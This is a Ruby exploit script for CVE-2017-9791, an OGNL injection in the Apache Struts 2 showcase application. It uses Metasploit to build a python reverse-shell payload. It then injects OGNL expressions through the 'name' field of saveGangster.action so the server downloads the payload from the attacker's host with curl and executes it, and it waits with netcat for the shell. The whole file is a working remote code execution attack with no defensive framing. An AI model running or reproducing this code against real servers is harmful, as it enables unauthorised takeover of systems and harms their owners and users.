#!/usr/bin/env ruby
# may need to change some things up here. serve up an http service
# via: pythom -m SimpleHTTPServer 
# Tested against struts framework 2.3.31 on RHEL.
# ...Mario Ceballos

require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex'


host     = ARGV[0]
callback = ARGV[1]

def usage
	puts "[*] CVE-2017-9791 GangsterAction.java"
	puts "[*] #{$0} <host> <callback>"
	exit
end

usage if ARGV.size < 2

$framework = Msf::Simple::Framework.create(
	:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
)
shell = $framework.payloads.create("python/shell_reverse_tcp")
shellcode = Msf::Simple::Payload.generate_simple(shell,
		{
			'OptionStr' => "LHOST=#{callback} LPORT=1975",
			'Format'    => 'raw',
		})

fd = File.new("mc.py","wb")
fd.write(shellcode)
fd.close

puts "[*] Payload created..."

download = "curl http://#{callback}:8000/mc.py -O mc.py"
exec     = "/usr/bin/python mc.py"

payload = "%{"
payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload += "(#_memberAccess?(#_memberAccess=#dm):"
payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload += "(#ognlUtil.getExcludedPackageNames().clear())."
payload += "(#ognlUtil.getExcludedClasses().clear())."
payload += "(#context.setMemberAccess(#dm))))."
payload += "(@java.lang.Runtime@getRuntime().exec(\"#{download}\"))"
payload += "}"

payload1 = "%{"
payload1 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload1 += "(#_memberAccess?(#_memberAccess=#dm):"
payload1 += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload1 += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload1 += "(#ognlUtil.getExcludedPackageNames().clear())."
payload1 += "(#ognlUtil.getExcludedClasses().clear())."
payload1 += "(#context.setMemberAccess(#dm))))."
payload1 += "(@java.lang.Runtime@getRuntime().exec(\"#{exec}\"))"
payload1 += "}"


begin
sock = Rex::Proto::Http::Client.new(host, port = "8080", context = {}, ssl = false)

req = sock.request_cgi(
	{
		'uri'   => "/struts2-showcase/integration/saveGangster.action",
		'version' => '1.0',
		'method' => 'POST',
		'headers' => {
			'Referer' => "http://#{host}:8080/struts2-showcase/integration/editGangster",
		},
		'encode_params' => true,
		'vars_post' => {
		'age' => Rex::Text.rand_text_numeric(3),
		'__checkbox_bustedBefore' => 'True',
		'name' => payload,
		'description' => 1
		},

	})

	sock.send_request(req)
	data = sock.read_response()
	if data and data.body =~ /added successfully/
		puts "[*] Successfully added payload!"
		File.unlink("mc.py")
			req = sock.request_cgi(
        			{
                			'uri'   => "/struts2-showcase/integration/saveGangster.action",
                			'version' => '1.0',
                			'method' => 'POST',
                			'headers' => {
                        			'Referer' => "http://#{host}:8080/struts2-showcase/integration/editGangster",
                },
                			'encode_params' => true,
                			'vars_post' => {
                			'age' => Rex::Text.rand_text_numeric(3),
                			'__checkbox_bustedBefore' => 'True',
                			'name' => payload1,
                			'description' => 1
                			},

        			})
	
        		sock.send_request(req)
			puts "[*] Waiting for callback!..."
			system("nc -v -l 1975")
			exit
	else
		puts "[!] Nope!"
	end
rescue => e
	puts "[!] #{e}"
	exit
end
